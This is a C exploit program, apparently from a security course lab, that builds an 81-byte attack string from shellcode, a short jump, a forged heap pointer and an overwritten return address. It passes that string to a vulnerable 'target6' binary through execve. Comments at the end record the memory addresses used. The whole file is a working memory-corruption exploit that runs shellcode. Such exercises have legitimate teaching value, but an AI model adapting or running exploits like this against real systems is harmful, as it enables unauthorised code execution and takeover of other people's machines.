#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

#define PH 0x01 // placeholder
#define P_FAKE "\xeb\x06"
#define P_ADDR "\x48\xec\x04\x01" 
#define RET_ADDR "\xa8\xfe\x21\x30" 


int main(void)
{
  char attack_string[81];
	memset(attack_string, PH, 81);
  memcpy(attack_string, P_FAKE, 2);
  memcpy(&attack_string[8], shellcode, strlen(shellcode));
  memcpy(&attack_string[72], P_ADDR, 4);
	memcpy(&attack_string[76], RET_ADDR, 4);
	attack_string[80] = '\0';

  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[1] = attack_string; 
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
// RA: 0x3021fea8
// P:  0x104ec48
// Q:  0x104ec98